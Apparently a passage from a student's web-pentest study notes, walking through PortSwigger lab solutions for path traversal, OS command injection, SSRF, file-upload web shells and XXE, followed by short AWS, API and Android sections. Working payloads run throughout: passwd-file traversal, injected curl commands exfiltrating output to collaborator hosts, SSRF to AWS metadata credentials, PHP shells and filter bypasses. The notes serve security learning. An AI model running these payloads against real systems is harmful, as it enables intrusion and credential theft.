o	GET /showimage.php?file=../../etc/passwd
	Now here we got the passwd file.
o	If works so we can try to give attackers website.
o	GET /showimage.php?file=https://hacker.com/malicious.php
	Like
o	GET /showimage.php?file=https://brutelogic.com.br/poc.svg
	This link will create a poop-up.
	In that case we have to try .php file
o	https://brutelogic.com.br/poc.svg
	<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

•	PORTSWINGER LABS: Directory traversal

•	Lab 1: File path traversal, simple case
o	GET /image?filename=19.jpg
o	GET /image?filename=../../../etc/passwd

•	Lab 2: File path traversal, traversal sequences blocked with absolute path bypass
o	GET /image?filename=11.jpg HTTP/1.1
o	GET /image?filename=/etc/passwd HTTP/1.1

•	Lab 3: File path traversal, traversal sequences stripped non-recursively
o	GET /image?filename=10.jpg HTTP/1.1
o	In this case
	It could be the Protection:
	../  {Nothing}
	../etc/passwd  etc/passwd
	Protection will remove ../ so we need to use ....//
	....//....//etc/passwd  ../../etc/passwd
•	It will remove red part and the other part will execute. OR
	..././  ../
o	GET /image?filename=..././..././..././etc/passwd HTTP/1.1
o	GET /image?filename=....//....//....//etc/passwd HTTP/1.1

•	Lab 4: File path traversal, validation of file extension with null byte bypass
o	GET /image?filename=20.png HTTP/1.1
o	In this case, sometime file extension is necessary but if we use passwd.png then it will not work bcz passwd file does not contain any extension, so we need to use null byte
	%00  it will remove part after %00
•	Passwd%00.png
	%20  create space in between both.
	%2a  put text after in underline.
	%0a  through on next line.
	%09  put TAB
o	GET /image?filename=../../../etc/passwd%00.png HTTP/1.1

•	Lab 5: File path traversal, validation of start of path
o	GET /image?filename=/var/www/images/1.jpg HTTP/1.1
o	In this case, path is given and just replace file with our path, then it will work.
o	GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1

•	Lab 6: File path traversal, traversal sequences stripped with superfluous URL-decode
o	GET /image?filename=11.jpg HTTP/1.1
	In this case, we need to encode ../ in url, that is %2e%2e%2f or just encode / in url, %2f
	%2f  / (Single encoding)
	%252f  %2f  / (Double encoding) (CTRL + U )
	%2e%2e%2f  ../ (Single encoding)
	%252e%252e%252f  %2e%2e%2f  ../ (Double encoding)
o	GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
o	GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
•	We can paste payload in User-Agent only if we are able to access log file.
o	<?php phpinfo()?>

•	BURPSUIT INTRUDER: emadshanab/LFI-Payload-List | GitHub
o	Place the payload location in the parameter and paste payloads.
o	Add root:x in Options > Grep-Match
o	To speed up, Create new resource pool, and put 100 in Max concurrent requests.

•	BOX TESTING
o	Black Box Testing  No access to code.
o	White Box Testing  Full access to code.
o	Gray Box Testing  Partial access to code.

•	Using Kali Linux:
o	ffuf - Fuzz Faster U Fool (Fast web fuzzer written in Go)
	ffuf -w lfi-payload.txt -u https://0a4c003c0455c109c0b78cec00a200ef.web-security-academy.net/image?filename=FUZZ -mc 200
•	..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd [Status: 200, Size: 2262, Words: 25, Lines: 41, Duration: 209ms]
o	liffy: Local file inclusion exploitation tool - GitHub
	Used to crack LFI vulnerabilities
 
*ATTACK*

OSCommand Injection (Critical Vulnerability) 

•	Operating Systems
o	Windows
	If target using windows then inject windows-based command and somehow it gets executes then it a vulnerability.
o	Linux (Ubuntu, CentOS)
	Inject linux based commend, if gets executes then it’s a vulnerability.
•	Steps:
1.	Mapping of Application
2.	Find the parameters
3.	Inject Payload

o	Tip: Headers (Cookie, Referrer, User-Agent) can be vulnerable.

•	Useful commands
o	Name of current user
	whoami (Linux)
	whoami (Windows)
o	Operating system
	uname -a (Linux)	
	ver (Windows)
o	Network configuration
	ifconfig (Linux)	
	ipconfig /all (Windows)
o	Network connections
	netstat -an (Linux)
	netstat -an (Windows)
o	Running processes
	ps -ef (Linux)
	tasklist (Windows)

•	Useful Characters
o	|
o	||
o	&  %26
o	&&
o	;
o	\r  %0d
o	0x0a or \n  %0a (Newline)
o	`id`  `<command>`
o	$(id)  $(<command>)

o	Here, can inject command in parameter to get execute.

	Example.com/file/?ping=67.78.56.90 %26 cat /etc/passwd
•	Ping 67.78.56.90 & cat /etc/passwd
	example.com/file/?ping=198.168.0.1 || cat /etc/passwd
	example.com/file/?ping=198.168.0.1 ; ls
	example.com/file/?ping=198.168.0.1 ; cat /etc/passwd

•	PORTSWINGER LABS: OS command injection

•	Lab 1: OS command injection, simple case
o	For GET /product?productId=1 HTTP/1.1
o	For POST /product/stock HTTP/1.1
 productId=20&storeId=1
	Here we have to check for both Requests if the parameters are vulnerable or not
	Check: productId=<payload>
•	1;ls
•	1|| ls, 1|ls
•	1%26ls, 1%26%26 ls
•	1` ls1`
•	1(ls)
	Check: storeId=<payload>
•	1;ls
•	1|| ls, 1|ls
•	1%26ls, 1%26%26 ls
•	1` ls1`
•	1(ls)
	If not work that mean there is a case, developer using some other command instead of ping
•	example.com/file/?ping=198.168.0.1
•	./script.sh 198.168.0.1 -flag
o	 To get execute we need to put payload in between ;;
o	./ script.sh 198.168.0.1 ;ls; -flag
o	For storeId=1;ls or storeId=1|whoami
•	TIP: If wants to run cat /etc/passwd but sometimes /etc/passwd get blocked. so, we can use ?? in it
o	cat /e?c/pa??wd
o	cat /e??/p?s??d
	can also try with cookies, headers, user-agents if it is vulnerable.

•	Lab 2: Blind OS command injection with time delays
o	For x||ping+-c+10+127.0.0.1||
csrf=C4juwS5&name=DNwG&email=asfa3af&subject=207&message=783
o	Payload: x||ping+-c+10+127.0.0.1||
o	In this case, result will not show but cmd will execute.
	ping c <seconds> for delaying the page response, Like 2sec. and then ip address
	ping c 4 127.0.0.1

•	Lab 3: Blind OS command injection with output redirection
o	After finding blind os cmd injection by using ping -c <sec> <IP>,now we can find other parameters  which contain filename=
	We can try to give parameter as /feedback/submit
o	Nothing is working and result is not showing,
o	So, we can store the result of passwd file in a passwd.txt file and then try to put this file in any filename= parameter.
o	For POST /feedback/submit HTTP/1.
csrf=WOzYPnme&name=name&email=asd%40asd.com& subject=subje&message=message
	email=|| cat /etc/passwd > passwd.txt ||
	email=||whoami>/var/www/images/whoami.txt||
	email=||whoami>whoami.txt||
o	For GET /image?filename=15.jpg HTTP/1.1
	filename=passwd.txt
	filename=whoami.txt
o	Another way to identify, by using Burp Collaborator Client.
	Burp > Collaborator client > Poll every 1 sec, then Copy to clipboard and paste burp-coll site in ||<>||
	|| nslookup mtj5tqnnseo7assn65k6iw6t.oastify.com ||
	Send request and check response in Collaborator client
	With this nslookup cmd if we see any DNS ping back that mean it vulnerable.
	Nslookup = check for DNS ping request.
o	OR can try curl http://<server.site>/<parameter>?=`<cmd>`
	||curl https://7fnveesauh94qyq.oastify.com/cmd?=`id`||
	curl = check for HTTP ping request.
	And In Request to Collaborator Tab, we can see result of the cmd which we used.
•	GET /cmd?=uid=12001(peter-M8qUUy) HTTP/1.1

•	Lab 4: Blind OS command injection with out-of-band interaction
o	How to automate this attack?
	Send request to Intruder > clear > add
	<a>curl http://<atackers.com><parameter>?=`command`<b>
	Positions > Attack type: Battering ram
	Payload paste : &,&&,|,||,;
	Payload Encoding: &
	Start attack and check HTTP req in Burp Collaborator.
•	Using Kali
o	Commix- COMMand Injection eXploiter | GitHub automates the detection and exploitation of command injection vulnerabilities.
o	$ git clone https://github.com/commixproject/commix.git commix to install
o	python commix.py -u <paste request url form burp> --data=”<POST req parameters>”
o	FOR LAB 1st SIMPLE CASE
	python commix.py -u https://0a2100ff0437594ac019536200db00a9.web-security-academy.net/product/stock --data="productId=20&storeId=1"

•	Lab 5: Blind OS command injection with out-of-band data exfiltration
o	Email=||curl+https://alz21na1hm2rwbjag54d7pm4uv0loa.oastify.com/cmd?=`id`||
o	Answer: peter-uRHL6i
 
*ATTACK*

Server-Side Request Forgery (SSRF)

Where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.
Client(192.168.1.1) ==============> target.com
Client(192.168.1.1) ====> example.com ===> internal.target.com

•	Steps:
1.	Mapping of Application
2.	Find the Parameters:
a.	file=img.jpg
b.	path= /files/app/login
c.	url=https://example.com
3.	Payloads

•	LAB USING BURPSUITE: http://testphp.vulnweb.com/
o	FOR GET /showimage.php?file=./pictures/1.jpg HTTP/1.1
o	file=https://< Burp-Collaborator-client.com>
	Check HTTP Request result in the Burp Collaborator
o	IP address 44.228.249.3
o	Cross Check this IP on
	https://ipinfo.io/
	https://viewdns.info/reverseip/
	https://hackertarget.com/reverse-ip-lookup/
o	If all showing the same domain as ur target is then that mean its vulnerable for SSRF
	vulnweb.com
•	Using Kali
o	Interact.sh | GitHub
o	Interact.sh is an open-source tool for detecting out-of-band interactions. It is a tool designed to detect vulnerabilities that cause external interactions.
o	interactsh-client
	[INF] bgj8uhhm87951f70Ør0zbaqb3ry750zq.oast.online
o	Copy, and paste into place of Burp Collaborator client
o	[cbgj8uhhm87951f700rØzbaqb3ry750zq] Received HTTP interaction from 44.228.249.3 at 2022-07-27 12:50:23
o	Again Cross check IP on websites
•	Escalate the impact (GET /showimage.php?file=<para>)
o	Whenever reporting the SSRF, HTTP Interaction is not enough, we need to increase the impact.
o	Try to read the internal file by putting this in parameter file:///etc/passwd
	file=file:///etc/passwd
	file=file://etc/passwd
	file=file://../etc/passwd
o	Try to access internal panel
	file=http://127.0.0.1 
	file=https://127.0.0.1 
	file=http://localhost 
	file=https://localhost 
	file=http://localtest.me
o	If target using AWS then try IP 169.254.169.254
	file=http:// 169.254.169.254
	GET /showimage.php?file=http://169.254.169.254
	GET /showimage.php?file=http://169.254.169.254/latest
•	dynamic
•	meta-data
o	In AWS always find these data
	Access key id
	Secret id
	Token
	ec2/ (Directory)
o	GET /showimage.php?file=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
	"Code" : "Success",
	  "LastUpdated" : "2022-11-28T10:55:11Z",
	  "Type" : "AWS-HMAC",
	  "AccessKeyId" : "ASIA46GF5YQ46SVNRNCO",
	  "SecretAccessKey" :"6+6G/ActuqWunO6KENhygaVWfvWnr4",
	  "Token" : "IQoJb3JpZ2luX2VjECsaCXVzL xR0WA==",
	  "Expiration" : "2022-11-28T17:25:11Z"


•	PORTSWINGER LABS: Server-side request forgery (SSRF)

•	Lab 1: Basic SSRF against the local server
o	For POST /product/stock HTTP/1.1
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
o	Convert selection > URL > URL-decode (Ctrl+Shift+U)
	Replace with stockApi=http://Burp-collabr.oastify.com
o	Check Result in Burp Collaborator, check ip
o	Now try with IP 127.0.0.1
	stockApi=http://127.0.0.1
	stockApi=http://127.0.0.1/admin
	stockApi=http://localhost/admin
	stockApi=http://localhost/admin/delete?username=carlos

•	Lab 2: Basic SSRF against another back-end system
o	For POST /product/stock HTTP/1.1 stockApi=http://192.168.0.1:8080/product/stock/check?productId=20&storeId=1
o	Use Directory Brut Force
	stockApi=http://192.168.0.1:8080/abc
	add abc to intruder, use dirs payload.
	Check for 200 Status code.
o	IF not work, Brute force IP
	In internal server mostly used IP range are
	192.168.0.0-255
	192.169.1.0-255
o	Add 4th Octet, Payload Type: Numbers, 0 to 255, Steps: 1.
	http://192.168.0.0-255:8080/admin
	check 200 or Different status code from other. (404)

•	Lab 3: SSRF with blacklist-based input filter
o	For POST /product/stock HTTP/1.1
stockApi=http://stok.shop.net:8080/?productId=20&storeId=
o	Check if SSRF with Burp Collaborator
o	stockApi=http://localtest.me or localhost
o	If not working, bcz keywords are blacklisted.
o	try 127.0.1 or 127.1 sometimes it works.
	stockApi=http://127.0.1
	stockApi=http://127.0.1/admin
•	admin keyword also blocked so, double encode it
	stockApi=http://127.0.1/%2561%2564%256d%2569%256e
	stockApi=http://127.1/%2561dmin
	stockApi=http://127.1/%2561dmin/delete?username=carlos

•	Lab 4: SSRF with filter bypass via open redirection vulnerability
o	For POST /product/stock HTTP/1.1
stockApi=/product/stock/check?productId=1
o	stockApi=<Burp Collaborator.net> not working bcz parameter contains path 
o	So we can find the Open Redirect vulnerability (Low level)
	For it find 302 status code. Send to Repeater.
o	GET /product/nextProduct?currentProductId=17&path=/product?productId=18
	path=(it contains location, so we can try Open Redirect)
	path=<attackers.redirect.site.com> it will open redirect.
o	Can also use XSS
	path=javascript:alert(1)
o	For SSRF, SSRF in path also not working. So,
	Copy whole path after GET
	Paste into POST stockApi= and encode it Ctrl + E
o	stockApi=/product/nextProduct%3fcurrentProductId%3d17%26path%3dhttps%3a//< BurpCollaborator.net>
o	stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
o	TIP:
	If target have to Open Redirect to exploit SSRF, then we can add @ or . before BurpCollaborator.net
•	stockApi=@BurpCollaborator.net
	HOW DOES IT WORK?
Frontend: url=/path/file
Backend: https://target.com/path/file
•	URL= @example.com
•	https://target.com@example.com
o	@ leads to example.com it’s a rule in web development
•	URL= . example.com
•	https://target.com.example.com
o	. makes example.com as a sub domain.
•	URL= target.com#example.com
o	Everything after # will not get execute.

•	Lab 5: Blind SSRF with out-of-band detection
o	Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater. 
o	Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request. 
o	Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds, and try again, since the server-side command is executed asynchronously. 
o	You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. 
o	For GET /product?productId=2 HTTP/1.1
	Referer: https://dbe2ub0qv5cnaqmwmvd17pw.oastify.com
	Check HTTP request in Burp Collab

•	Lab 6: SSRF with whitelist-based input filter
o	Here we can use @ bcz it whitelisted stock.weliketoshop.net. that mean it must be there, we can’t remove.
	http://<burpcoll>@stock.weliketoshop.net/
o	can append # or %2523 double encode
	http://<burpcoll.net>%2523@stock.weliketoshop.net
o	If it’s SSRF then we can try
	http://127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos

•	TIP: PayloadsAllTheThings / Server-Side Request Forgery | GitHub
o	Payloads with localhost
	http://127.0.0.1:80
	http://127.0.0.1:443
	http://127.0.0.1:22
	http://0.0.0.0:80
	http://0.0.0.0:443
	http://0.0.0.0:22
	http://localhost:80
	http://localhost:443
	http://localhost:22
o	Bypass localhost with a domain redirection
	http://customer1.app.localhost.my.company.127.0.0.1.nip.io
	http://customer1.app.localhost.my.company. 169.254.169.254.nip.io (for AWS)
o	Bypass using enclosed alphanumeric
	Unicode Text Converter (qaz.wtf)
	Encode domain name, and try, sometimes 
•	Burp Collaborator Everywhere (Extension)
o	Install in from Extender > BApp Store (Only for Pro)
o	To use it, crawl the target website manually. Findings will be presented in the 'Issues' tab. Wait for HTTP ping back request, can also send it to Repeater.
•	Lab: Blind SSRF with Shellshock exploitation
o	Answer: OS user: peter-8bmoSl

*ATTACK*

File Upload Vulnerability
When a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

•	STEPS:
1.	Manually browsing webapp
2.	Find file upload feature
3.	Or use upload Scanner
4.	Exploit

Upload Scanner: BurpSuite Professional Extender use to find vulnerabilities related to file upload functionalities.


•	PORTSWINGER LABS: File Upload Vulnerability

•	Lab 1: Remote code execution via web shell upload
o	Mostly can find file upload feature after login in account.
o	Here, try to create shell.php file contain simple code.
	<?php phpinfo()?> save it as .php
•	Outputs a large amount of information about the current state of PHP.
o	Here, we are uploading php file instead image.
	After uploading, click on open image in new tab
•	We will see PHP information page.
o	If we able to upload .php files, can execute RCE.

•	Lab 2: Web shell upload via Content-Type restriction bypass
o	Here, It shows the error file type “application/octet-stream”
o	Intercept the Request of Uploading
	For POST /my-account/avatar
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
o	Here Content-Type is application/octet-stream, Go to google search Content Type for jpg,
	Extension: .jpeg , .jpg
	Kind of document: JPEG images
	MIME Type: image/jpeg
o	Replace “application/octet-stream”
	Content-Type: application/octet-stream
o	With “image/jpeg”
	Content-Type: image/jpeg
o	Send Request, Reload page, Click ‘Open Image in New Tab’
o	Will see the result
	RBuOI7i3kguvRRC6uhYFaSrHDCWvGTXT

•	Lab 3: Web shell upload via path traversal
o	Here, php file can be uploaded but, won’t be execute. Can be see its source code.
	Bcz, suppose developers added .htaccess file in this path, and .htaccess file treat every file as image file. So that other file be show as image.
o	.htaccess file is used to primarily setup rewrite rules to control the way your site is accessed.
o	Solution: Can upload file into another directory where .htaccess file is not present.
o	For POST /my-account/avatar
	We can put ../ before shell.php and encode / in url
	filename="../shell.php"  filename=".. %2fshell.php"
o	shell.php
	<?php echo file_get_contents('/home/carlos/secret'); ?>
o	New Path:
	web-security-academy.net/files/avatars/..%2fshell.php
	If we remove “/avatars” it will still work
	web-security-academy.net/files/shell.php

•	Lab 4: Web shell upload via extension blacklist bypass
o	Here we can upload the file but won’t get execute here.
o	So, we can try XSS. Upload the shell.php file, Send request to Repeater.
o	Rename .php to .jpg and Send Request.
	filename="shell.jpg"
o	Reload the page and View Page Source, Find shell.jpg file
	<img src="/files/avatars/shell.jpg" class=avatar>
o	Can make XSS Payload:
	“><script>alert(1)</script>
	filename=’”> <script>alert(1)</script>’ (Replaced“”=‘’)
o	And Send Request. We will get Popup.
o	So, We can upload only .jpg extension.
o	It Could Be a case of Blacklisting and Whitelisting
	Blacklisting: Selected keywords are only block.
	If Developers added .php or .html, that mean you can use .anything expect .php and .html
	Whitelisting: Selected keywords are only allowed.
	If developers added .png or .jpg, means u only can use these both extensions, not others.
o	Here, try to change .php to .php2
	filename=“shell.php2”, doesn’t work, change version
	filename=”shell.php3” or try till php7, php7 is latest
o	We also can try .html files.
	code will be change <script>alert(1)</script>
o	Try shell.phtml
	<?php phpinfo() ?> 		Its worked.
o	If everything is blacklisted then we can upload .htaccess, so it will treat every file as php file.
	filename=“.htaccess”
	Content-Type: text/plain
	File Content Would be:
•	SetHandler application/x-httpd-php
	Send Request, If it already contains this file, then it will overwrite.
o	Let’s try to upload shell.abc
	filename=“shell.abc”
	Content-Type: application/php
•	<?php phpinfo() ?>   
o	We also can try, if php is blacklisted then, change Char
	.PHP or .Php or .pHP or .pHp or .phP

•	Lab 5: Web shell upload via obfuscated file extension
o	Here, Whitelisted only .jpg and .png files and everything is blocked, so we can’t upload .htaccess file.
o	Try shell.php.jpg, it uploaded but didn’t work.
o	So we can use null byte injection
	%00, or 0x00 in hex
	filename=“shell.php%00.jpg”
	here %00 is removing the .jpg
o	Remove %00.jpg part from URL
	files/avatars/shell.php%00.jpg
	files/avatars/shell.php
o	Can also Try:
	shell.php%20.jpg  space
	shell.php%09.jpg  Tab
	shell.php%0a.jpg  put .jpg in new line
	shell.php .jpg  manual space will also work.

•	Lab 6: Remote code execution via polyglot web shell upload
o	Here, it not checking the content type as well as extension.
o	So it must be checking the content in the image file. or body of the image file.
o	Search Hex Editor ExifTool or HxD
	Open file any image file. and paste code in between middle part of Decoded Text.
	<?php phpinfo() ?>
	DYÜÛˆý`ù©*ÊÒ‡‚Jínˆ/èa&&“’‘ÈòØãýqúj¯<?php phpinfo() ?>@È0îFÚÜFÙ]ã°Í{-WNU†ŸgrÌM‰%T‘ â é ¬ùçU˜dVß~e7~˜
	Save or Export file, and change extension to .php
	Upload and Open Image in New Tab
o	In kali
	exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

•	Lab 7: Web shell upload via race condition
o	Here, nothing is working. It could be race condition.
o	Suppose for Image.jpg
•	Image.jpg  Uploaded  Verification  Stay
o	If we upload .jpg file
o	It will get uploaded.
o	After this it will check if this file is valid image file or not.
o	If yes, then it will stay in server.
o	For shell.php
•	Shell.php  Uploaded  Verification  Deleted
o	If we upload .php file
o	It will get uploaded without error.
o	After this it will check if this file is valid image file or not.
o	If No, then it will delete from the server.
o	Exploit
	Shell.php  Uploaded  EXPLOIT  Verification  Del
o	Here, it’s a vuln that we can upload .php file, but before Verification in the less time we have to jump into the time, have to pick that time fare and Exploit.
•	Race Condition:
o	We have to upload the file again and again, again and again, again and again, and simultaneously refreshing page again and again, again and again, so server take time to processes the verification, at that time, our .php file will get executed before deleting from the server.
	filename="shell.php .jpg"
•	Send it to Intruder > Clear
•	Or use Extender, Right-Click > Extensions > Turbo Intruder > Send to turbo intruder.
•	Payloads > Type > Null payloads > Continue indefinitely
•	Start Attack and Refresh the page where /shell.php
o	/avatars/shell.php%20.jpg  /avatars/shell.php
	If u see file that means its vulnerable
o	Maintain the access:
	For this we have to create new .php file.
	In this file, write a code to save php file.
•	In linux cmd:
o	echo “Hello World” > file.txt
•	Similarly,
o	echo “<?php phpinfo() ?>” > shell.php
•	To get execute: payload.php
o	<?php system(‘echo “<?php phpinfo() ?>” > shell.php‘) ?>
	Start attacking and refresh the page.
 
*ATTACK*
XML external entity (XXE) injection | PayloadBox | PayloadsATT
When performed successfully can disclose local files in the file system of the website.  XXE is targeted to access these sensitive local files of the website that is vulnerable to unsafe parsing.

•	Internal Entity: 
o	If an entity is declared within a DTD it is called as internal entity.
	Syntax: <!ENTITY entity_name "entity_value">

•	External Entity: 
o	If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM.
	Syntax: <!ENTITY entity_name SYSTEM "entity_value">

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
Here it returns a value (381) , and using payload, have to get passwd file

Payload: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Here “xxe” is a variable, which will return the passwd file as an error. by putting &xxe on the place of 381

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

Types:
1.	File Retrieval XXE
2.	Blind XXE
3.	XXE to SSRF

•	PORTSWINGER LABS: XML external entity (XXE) injection

TYPE 1: File Retrieval XXE
•	Lab 1: Exploiting XXE using external entities to retrieve files
o	For POST /product/stock
	<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY payload SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&payload;</productId></stockCheck>

TYPE 3: XXE to SSRF  
•	Lab 2: Exploiting XXE to perform SSRF attacks
o	For POST /product/stock HTTP/1.1
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp.collaborator.com"> ]>
o	We got HTTP ping back, with IP, after cross checking IP on ipinfo.io and ViewDNS.info
o	We got, they are using AWS services, so we can use AWS IP 169.254.169.254
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/ "> ]>
o	And default location of sensitive data
	latest/meta-data/iam/security-credentials/admin
o	Payload:
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
o	And we got   "AccessKeyId", "SecretAccessKey", "Token" to report.

TYPE 2: Blind XXE
•	Lab 3: Exploiting XInclude to retrieve files
o	For POST /product/stock HTTP/1.1
productId=2&storeId=3
o	Here, there is no XML code to inject XEE
o	In this case we have to use XInclude statement to retrieve the data.
o	XInclude:
	A part of the XML specification that allows an XML document to be built from sub-documents. 
	Can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.
•	For ex: productId=2 & storeId=3 (in the place of 2 and 3)
	To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include.
	For example:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo>
o	productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=3

TYPE 1: File Retrieval XXE 
•	Lab 4: Exploiting XXE via image file upload
o	Here we can inject payload into the .svg image file.
o	Scalable Vector Graphics (SVG) are an XML-based markup language for describing two-dimensional based vector graphics.
o	Payload.svg
	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
o	Or payload2.svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" 
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text></svg>
o	Upload payload.svg file on server and open into new tab
o	Or view page source find the image link and open it.

 
Section 8
AWS PEN-TESTING

1. Pentesting in the Cloud:
	The cloud computing service models
o	Created by the NIST 2009
o	Offer scalability and flexibility.
o	3 Service modalities:
	IaaS (Infrastructure-as-a-service)
•	On-demand virtualized IT infrastructure
•	Most complete modality
•	Most Flexible
•	Provides infrastructure services.
o	Like network, storage, and virtualization

	PaaS (Platform-as-a-service)
•	Offers the infrastructure to host applications.
•	Simplifies setup and maintenance.
•	Less flexible compared to IaaS.
•	Blurry line between IaaS and PaaS
•	IaaS may come with a preconfigured OS.

	SaaS (Software-as-a-service)
•	Offers fully managed infrastructure.
•	Delivers software and licensing via subscription.
•	Client manages data and user access.
•	Easiest solution for the client
•	Least flexible.

	FaaS (Function-as-a-service)
•	Serverless architecture
•	On-demand functionality
•	No charges when not in use.
•	Easiest solution for the client
•	Least flexible.

	The AWS pentesting policy
o	AWS Customer Support/Service Policy for Penetration Testing
	https://aws.amazon.com/security/penetration-testing/
o	Permitted Services
	Amazon EC2 instances, WAF, NAT Gateways, and Elastic Load Balancers
	Amazon RDS
	Amazon CloudFront
	Amazon Aurora
	Amazon API Gateways
	AWS AppSync
	AWS Lambda and Lambda Edge functions
	Amazon Lightsail resources
	Amazon Elastic Beanstalk environments
	Amazon Elastic Container Service
	AWS Fargate
	Amazon Elasticsearch
	Amazon FSx
	Amazon Transit Gateway
	S3 hosted applications (targeting S3 buckets is strictly prohibited) 

o	Prohibited Activities
	DNS zone walking via Amazon Route 53 Hosted Zones
	DNS hijacking via Route 53
	DNS Pharming via Route 53
	Denial of Service (DoS), Distributed Denial of Service (DDoS), Simulated DoS, Simulated DDoS (These are subject to the DDoS Simulation Testing policy
	Port flooding
	Protocol flooding
	Request flooding (login request flooding, API request flooding) 

	Methodology
o	Pentesting:
	Identify vulnerable points in services.
	Simulating a real attack
	Same tools, techniques, and reasoning as hacking

o	Cloud Pentesting:
	Not all types of attacks are allowed.
	For SaaS and FaaS, pentests are generally not allowed at all.
	In some cases, comparable to pentesting an application.

o	STRIDE
	Threat model developed by Microsoft.
	Complete analysis of:
•	Proces ses
•	Data stores
•	Data streams
•	Confidence limits

	Mnemonic for six categories:
•	S – Spoofing
o	Pretend to be someone else.
	Steal credentials.
o	A07-ldentification and Authentication Failures (OWASP-2021)

•	T – Tampering
o	Modify data at rest or in transit.
	Change hosted image.
	Tamper API call.
	Alter cloud logs.
o	A03-lnjection (OWASP-2021)
o	A05-Security Misconfiguration (OWASP-2021)
o	A08-Software and Data Integrity Failures (OWASP-2021)

•	R – Repudiation
o	Deny an action.
	Delete cloud log.
	Mask performed action.
o	A07-ldentification and Authentication Failures (OWASP-2021)
o	A09-Security Logging and Monitoring Failures (OWASP-2021)

•	I - Information disclosure
o	Gain access to restricted data.
	Misconfigured data store.
o	A02-Cryptographic Failures (OWASP-2021)
o	A03-Injection (OWASP-2021)
o	A05-Security Misconfiguration (OWASP-2021)

•	D - Denial of Service
o	Destroy or encrypt resource.
	Make resource unavailable.
	Disable account or user.
o	A04-lnsecure Design(OWASP-2021)
o	A05-Security Misconfiguration (OWASP-2021)
o	A06-Vulnerable and Outdated Components (OWASP-2021)

•	E - Elevation of Privilege
o	Gain unauthorized permission.
	misconfigured IAM permission
o	A01 -Broken Access Control (OWASP-2021)
o	A07-ldentification and Authentication Failures (OWASP-2021)
o	A10-Server-Side Request Forgery (SSRF) (OWASP-2021)

	Recap


 
 
Section 9
API PENTEST

API (Applications Programming Interface) penetration test is a security evaluation conducted by an external pentester to detect vulnerabilities that may exist in API integrations due to incorrect business logic, core programming issues etc, often by using the same techniques and methodology as a real-world attacker.

Passive Reconnaissance:
o	Use Google Dorking for ex: 
	intitle:”api” site:”coinebase.com”
	inurl:”/api/v1” site:”microsoft.com”
	intitle:json site:ebay.com
o	Use GitHub Dorking for ex:
	api key exposed
	extension:json nasa
	shodn_api_key
	“authorization: Bearer”
	filename:swagger.json
o	Use Shadon.io for ex:
	“content-type: application/json”
	“wp-json”

Active Reconnaissance:
	
 
Section 10
Mobile PENTEST

Android Application Security 
APPLICATIONS
HOME	DIALER	SMS/MMS	IM	Browser	Camera	Alarm	Calculator
Contacts	Voice Dial	Email	Calendar	Media Player	Photo Album	Clock	
APPLICATIONS FRAMEWORK
Activity Manager
	Window Manager
	Content Providers
	View System
	Notification Manager
Package Manager
	Telephony Manager	Resource Manager
	Location Manager
Libraries	Android Runtime
Surface Manager	Media
Framework	SQLite	Webkit	Libc	Core Libraries
OpenGLIES	Audio Manager	FreeType	SSL		Dalvik VM
HARDWARE ABSTRACTION LAYER
Graphics	Camera
 
	Audio
	GPS 	Radio (RIL)	Bluetooth
	WiFi
LINUX KERNAL
Display Driver	Camera Driver	Bluetooth Driver	Shared Memory
Driver	Binder (IPC) Driver
USB Driver	Keypad Driver	WiFi Driver	Audio Drivers	Power Management


Android Platform PT Test cases:
❖ Finding 1: Database Stored in Android Device Without Encryption
❖ Finding 2: Insecure Data Storage
❖ Finding 3: Root Detection Not Implemented
❖ Finding 4: Application Debuggable is Enabled
